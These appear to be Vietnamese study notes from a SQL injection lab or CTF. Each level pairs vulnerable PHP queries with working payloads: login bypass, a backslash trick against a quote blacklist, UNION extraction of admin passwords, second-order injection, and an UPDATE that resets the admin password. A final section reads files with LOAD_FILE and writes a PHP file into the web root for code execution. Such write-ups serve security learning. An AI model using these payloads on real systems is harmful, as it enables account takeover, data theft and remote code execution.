## Example

### Example 1

```
$sql = "SELECT username FROM users WHERE username='$username' AND password='$password'";
$query = $database->query($sql);
```

C1: Truyền dữ liệu `admin' -- ` vào biến username.

C2: Truyền dữ liệu `admin' or 1 = '2`.

Giải thích: toán tử AND sẽ được ưu tiên thực hiện trước toán tử OR. Nên ta có logic của câu truy vấn như sau: TRUE OR (FALSE AND FALSE) --> TRUE OR FALSE = TRUE --> login thành công.

 ### Example 2

 ```
$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
$query = $database->query($sql);
```

Tương tự ex 1 nhưng lần này biến $username và $password được bọc trong dấu nháy kép. 

C1: Truyền dữ liệu `admin" -- ` vào biến username.

C2: Truyền dữ liệu `admin" or 1 = "2`.

### Example 3

```
$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
$query = $database->query($sql);
```

Có sự xuất hiện của hàm LOWER(). Cách khai thác:

Cách khai thác: `admin" ) -- `.

### Example 4

```
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}

function loginHandler($username, $password)
{
    if (!checkValid($username) || !checkValid($password))
        return "detected";
....

    $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
    $query = $database->query($sql);
```

Ở ví dụ này chương trình đưa dấu nháy kép " vào blacklist. Vì vậy hãy sử dụng dấu backslash `\` để loại bỏ dấu " trong câu truy vấn. Cách khai thác:

Ở trường username nhập: `\`. Như vậy username sẽ nhận giá trị `) AND password=MD5(`.

Ở trường password thực hiện nối dài câu truy vấn để khai thác sqli: `) union select 'admin' -- `.

Lúc này câu truy vấn sẽ trở thành: `SELECT username FROM users WHERE username=LOWER() AND password=MD5() UNION SELECT 'admin' -- `

### Example 5

```
$sql = "SELECT username, password FROM users WHERE username='$username'";
```

Truy vấn giá trị username và password từ database nơi mà usernmae bằng giá trị biến $username nhập vào. password nhập vào sẽ được hash md5 trước khi so sánh với password truy vấn trước đó.

Cách khai thác: nối dài câu truy vấn với `union`.

C1: Truyền dữ liệu vào biến username: `' UNION SELECT password, md5('1') from users where username = 'admin' -- `. Password: `1`. Bằng cách này sẽ lấy được được password của admin từ database.

C2: Cách này sẽ thao túng luôn password và đăng nhập với tư cách admin với bất kì password nào. `' UNION SELECT 'admin', md5('1') -- `.

### Example 6

```
$sql = "SELECT content FROM posts WHERE id=$id";
```

Khai thác truy vấn database version: `0 UNION SELECT @@version –- `.

### Example 7

```
$sql = "SELECT username FROM users WHERE username=? and password=?";
$statement = $database->prepare($sql);
$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
$statement->execute();
$statement->store_result();
$statement->bind_result($result);

if ($statement->num_rows > 0) {
    $statement->fetch();
    $_SESSION["username"] = $result;
    die(header("Location: profile.php"));

...
```
Ở ex này câu truy vấn sử dụng "prepared statements" giúp chống lại các cuộc tấn công SQL injection. Nhưng tại file profile.php lại sử dụng câu truy vấn nối chuỗi `$sql = "SELECT email FROM users WHERE username='$username'";` dẫn đến bị khai thác:

Tạo tài khoản với username: `' UNION SELECT GROUP_CONCAT(username, password) FROM users -- `.

### Level 8
```
$sql = "UPDATE users SET email='$email' WHERE username='$username'";
```
Cách khai thác: lợi dụng câu truy vấn UPDATE thay đổi password của `admin` theo ý muốn `', password = md5('1') where username='admin' --  `.




`$sql = "SELECT * FROM posts WHERE id=" . $_GET['id'];`

- xac dinh so cot
  
`select from posts where id=1+union+select+1,2,3,4+--+-`

- mysql cho phep doc, ghi file --> database user duoc quyen doc ghi file 

`LOAD_FILE('file_name')  -- read`

`INTO OUTFILE  -- write`

`1+union+select+1,2,3,LOAD_FILE('/flag_a7bd2')+--+-`

`1+union+select+1,2,3,'<?php phpinfo() ?>' INTO OUTFILE '/var/www/html/test.php'+--+- `   (ghi file tai document root --> rce)




 

